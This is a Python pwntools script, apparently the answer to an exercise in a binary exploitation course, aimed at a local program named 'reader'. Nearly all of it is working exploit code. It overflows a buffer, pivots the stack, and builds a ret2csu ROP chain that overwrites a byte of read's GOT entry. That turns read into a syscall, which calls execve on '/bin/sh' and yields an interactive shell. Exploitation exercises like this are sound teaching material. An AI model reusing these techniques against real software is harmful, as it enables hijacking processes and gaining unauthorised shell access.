#!/usr/bin/python

# answer to Chap3. Q7 (f)

from pwn import *

r = process("./reader")
gdb.attach(r)
raw_input('continue ->')

magic_char = 0x2e  # 0x0e .. 0xfe can be bruteforced

pop_rdi = 0x4005b3
pop_rsi_r15 = 0x4005b1
pop_rsp_3 = 0x4005ad
read = 0x400400
csu_1 = 0x4005aa
csu_2 = 0x400590

writeable = 0x601800
read_got = 0x601018

rop = 'Helloworldhelloaliens'
rop = ''
'''
rop += p64(pop_rdi)
rop += p64(0x602040)
rop += p64(puts)
rop += p64(pop_rdi)
rop += p64(writeable + 0x30)
rop += p64(readline)
'''


def csu_head(prip, rdi, rsi, rdx):
    p = ''
    p += p64(csu_1)
    p += p64(0)
    p += p64(1)
    p += p64(prip)
    p += p64(rdx)
    p += p64(rsi)
    p += p64(rdi)
    return p


def csu_chained_call(prip, rdi, rsi, rdx):
    p = ''
    p += p64(csu_2)
    p += p64(0xdeadbeef12348765)
    p += p64(0)
    p += p64(1)
    p += p64(prip)
    p += p64(rdx)
    p += p64(rsi)
    p += p64(rdi)
    return p


pad = '/bin/sh\0' + p64(writeable - 0x20) + p64(0)

pad = pad.ljust(0x20)

rop += csu_head(read_got, 0, read_got, 1)
rop += csu_chained_call(read_got, 1, read_got, 59)
rop += csu_chained_call(read_got, writeable - 0x20, writeable - 0x18,
                        writeable - 0x10)
rop += p64(csu_2)

rop_base = ''
rop_base += p64(pop_rsi_r15)
rop_base += p64(writeable - 0x20)
rop_base += p64(0xdeadbeefaaedffbc)
rop_base += p64(read)
rop_base += p64(pop_rsp_3)
rop_base += p64(writeable - 0x18)

assert '\n' not in rop

p = ''
p += (cyclic(0x18) + rop_base).ljust(0x400)
p += (pad + rop).ljust(0x400)
p += chr(magic_char)

r.send(p)

r.interactive()
